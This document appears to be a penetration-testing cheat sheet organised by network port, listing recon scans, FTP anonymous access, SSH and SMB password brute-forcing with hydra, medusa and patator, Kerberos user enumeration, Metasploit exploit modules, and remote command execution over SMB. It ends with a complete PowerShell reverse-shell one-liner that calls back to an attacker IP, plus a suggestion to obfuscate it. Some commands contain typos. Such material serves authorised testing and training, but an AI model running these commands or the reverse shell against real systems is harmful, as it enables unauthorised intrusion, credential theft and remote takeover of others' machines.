CONTENT
=======
* [RECON](#RECON)
  * [File Enumeration](#file-enumeration)
  * [Port 21 - FTP](#port-21---ftp) 
  * [Port 22 - SSH](#port-22---SSH)
  * [Port 23 - Telnet]([#port-23-TELNET](#port-21---ftp))
  * [Port 25 - SMTP](#port-25-SMTP)
  * [Port 53 - DNS](#port-53---DNS)
  * [Port 69 - UDP - TFTP](#port-69---UDP---TFTP)
  * [Port 79 - Finger](#port-79---Finger)


# RECON
```bash
# Enumerate subnet 
nmap -sn 10.10.10.1/24
```

```bash
# Fast simple scan
nmap -sS 10.10.10.1/24
```

```bash
# extract live IPs from scan 
nmap 10.1.1.1 --open -oG scan_result; cat scan_results | grep "/open" | cut -d " " -f 2 > live-IPs
```

```bash
# complete slow scan
nmap -v -sT -A -T4 -p- -Pn --script vuln -oA full $IP
```

```bash
# UDP scan
nmap -sU 10.10.10.1
```

```bash
# generate a good scan_report
nmap -sV IP_ADDRESS -oX scan.xml && xsltproc scan.xml -o "report.html"
```
## File Enumeration

```bash
#check file type
file "file.xxx"
```
```bash
#analize string
strings "file.xxx"
```
```bash
#check a binary file in hex
ghex "file.xxx"
```

## Port 21 - FTP

```bash
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 $IP

# Banner Grabbing
telnet -vn $IP 21

# Anonymous login
ftp <IP>
>anonymous
>anonymous
>ls -a # List all files
>binary #Set transmission to binary instead of ascii
>ascii #Set transmission to ascii instead of binary
>bye #exit

# Browser connection
ftp://anonymous:anonymous@10.10.10.xx

# Download all files
wget -m ftp://anonymous:anonymous@$IP #Donwload all

```

## Port 22 - SSH


```bash
https://www.openssh.com  # Documentation

# Enumeration
nc -vn $IP 22


# Public SSH key of server
ssh-keyscan -t rsa $IP -p <PORT>

# BruteForce:

patator ssh_login host=$IP port=22 user=root 0=your_file.txt password=FILE0 -x ignore:mesg='Authentication failed.'

hydra -l user -P /usr/share/wordlists/password/password_list.txt -e s ssh://10.10.1.1

medusa -h 10.10.1.1 -u user -P /usr/share/wordlists/password/password_list.txt -e s -M ssh

ncrack --user user -P /usr/share/wordlists/password/password_list.txt ssh://10.10.1.1

nmap --script ssh-brute --script-args userdb=usernames.txt,passdb=passwords.txt 192.168.6.134

#Msf
use auxiliary/fuzzers/ssh/ssh_version_2


# Tunneling
sudo ssh -L <local_port>:<remote_host>:<remote_port> -N -f <username>@<ip_compromised>

```

## Port 23 - Telnet
```bash
# Banner Grabbing
nc -vn $IP 23

# nmap
nmap -n -sV -Pn --script "*telnet* and safe" -p 23 $IP

```

## Port 25 - SMTP
```sh
# Finding MX servers of an organisation
dig +short mx google.com

# smtps
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587

# Enumeration
nmap -p25 --script smtp-commands $IP
# or use  nmap plugin smtp-ntlm-info.nse
# enum_users
msf > auxiliary/scanner/smtp/smtp_enum
smtp-user-enum
nmap --script smtp-enum-users.nse $IP

```
## Port 53 - DNS

```bash
# nslookup
nslookup
> SERVER <IP_DNS> #Select dns server
> 127.0.0.1 #Reverse lookup of 127.0.0.1, maybe...
> <IP_MACHINE> #Reverse lookup of a machine, maybe...

# DNS lookups, Zone Transfers & Brute-Force
whois domain.com
dig {a|txt|ns|mx} domain.com
dig {a|txt|ns|mx} domain.com @ns1.domain.com
host -t {a|txt|ns|mx} megacorpone.com
host -a megacorpone.com
host -l example.com ns1.example.com
dnsrecon -d excample.com -t axfr @ns2.example.com
dnsenum domain.com
# DNS - Subdomains BF
dnsrecon -D subdomains-1000.txt -d <DOMAIN> -n <IP_DNS>
dnscan -d <domain> -r -w subdomains-1000.txt #Bruteforce subdomains in recursive way, https://github.com/rbsec/dnscan
```

## Port 69 - UDP - TFTP

```bash

nmap -p69 --script=tftp-enum.nse $IP 
#or
nmap -n -Pn -sU -p69 -sV --script tftp-enum $IP
# Download Upload
msf5> auxiliary/admin/tftp/tftp_transfer_util

```
## Port 79 - Finger
```bash
# Enumeration Banner Grabbing
nc -vn <IP> 79
echo "root" | nc -vn $IP 79

# User enumeration
finger @$IP       #List users
finger admin@$IP  #Get user info
finger user@$IP   #Get user info

# msf
msf> use auxiliary/scanner/finger/finger_users[README.md](https://github.com/Indunil-jayaranga/Lo0t_boX/files/9222613/README.md)

```
## Port 88 - Kerberos 
```bash
#GET USERS :

nmap -p 99 --script=krb5-enum-users --script-arg"krb5-enum-users.realm='DOMAIN'"  $IP

python kerbrute.py -dc-ip IP -users /root/htb/kb_users.txt -passwords /root/pass_common_plus.txt -domain DOMAIN -outputfile kb_extracted_passwords.txt

```

## Port 110 - POP3
```bash
telnet $IP
USER user@ip
PASS password

```

## Port 995 / 110 -POP
```bash
# Banner Grabbing
nc -nv $ip 110
openssl s_client -connect $ip:995 -crlf -quiet

# Automated
nmap --scirpt "pop3-capabilities / pop3-ntlm-info" -sV -port <PORT> $ip

```

## Port 111 - Rpcbind
```bash
# Enumeration
rpcinfo <domain> 
nmap -sSUC -p111 $ip

rpcinfo -p $ip
rpcclient -U "" $ip
    srvinfo
    enumdomusers
    getdompwinfo
    querydominfo
    netshareenum
    netshareenumall
```

## Port 123 - TNP
```bash
#Enumearation

nmap -sU -sV --script "ntp*" -p 123 $ip

ntpq -c readlist $ip
ntpq -c readvar $ip
ntpq -c monlist $ip
ntpq -c peers $ip
ntpq -c listpeers $ip
ntpq -c associations $ip 
ntpq -c sysinfo $ip
```

## Port 135 - MSRPC
```bash
# Enumeration
nmap $ip --script=msrpc-enum
nmap -n -sV -p 135 --script=msrpc-enum $ip

#msf
msf > use exploit/windows/dcerpc/ms03_026_dcom
msf > use auxiliary/scanner/dcerpc/endpoint_mapper
msf > use auxiliary/scanner/dcerpc/hidden
msf > use auxiliary/scanner/dcerpc/management
msf > use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor

# Identifying Exposed RPC Services

rpcdump -p port $IP
rpcdump.py $IP -p 135
```

## Port 139/445 - SMB
```bash
# Enum hostname
enum4linux -n $ip
nmblookup -A $ip
nmap --script=smb-enum* --script-args=unsafe=1 $ip

#Get version
smbver.sh $ip
msf > use scanner/smb/smb_version
smbclient -L \\\\$IP

#Get Shares 
smbmap -H $ip -R <sharename>
echo exit | smbclient -L \\\\
smbclient \\\\$ip\<share>
smbclient -L //$ip -N
nmap --script smb-enumshares -p139,445 -Pn $ip
smbclient -L \\\\$ip\\

# check null sessions
smbmap -H $ip
rpcclient -U "" -N $ip
smbclient //$ip/IPC$ -N

#Exploit null sessions
enum -s $ip
enum -U $ip
enum -P $ip
/usr/share/doc/python3-impacket/examles/samrdump.py $ip

# connect to username shares
smbclient //$ip/share -U username

# connect to share anonumously 
smbclient \\\\$IP\\<share>
smbclient //$IP/<share>
smbclient //$IP/<share\ name>
smbclient //$IP/<""share name"">
rpcclient -U " " $IP
rpcclient -U " " -N $IP

#check vulns
nmap --script smb-vuln* -p139,445 -Pn $ip

#check seceurity concerns
msfconsole -r /usr/share/metasploit-framwork/scripts/resource/smb_checks.rc

msfconsole -r /usr/share/metasploit-framwork/scripts/resource/smb_validate.rc

#exploits
msf > use exploit/multi/samba/usermap_script

#Bruteforce login
medusa -h $IP -u username -P passwordlist.txt -M smbnt
nmap -p445 --script smb-brute --script-args userdb=userfilehere,passdb=passwordlist.txt $ip  
nmap -script smb-brute $IP

#nmap smb enum & vuln
nmap --script smb-enum-*,smb-vuln-*,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-protocols -p 139,445 $ip

nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse -p 139,445 $ip

#Mount smb volume
mount -t cifs -o username=user,password=password //$ip/share /mnt/share

# Run cmd over smb from linux
winexe -U username //$ip "cmd.exe" --system

# smbmap
    #Enum
smbmap.py -H $ip -u administrator -p asdf1234
    #RCE
smbmap.py -u username -p 'password' -d DOMAINNAME -x 'net group "Domain Admins" /domain' -H $ip
    # Drive Listing
smbmap.py -H $ip -u username -p 'password' -L
    # Reverse Shell
smbmap.py -u username -p 'password' -d DOMAINNAME -H $ip -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.X""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"'

#you can use obfuscated one!
```

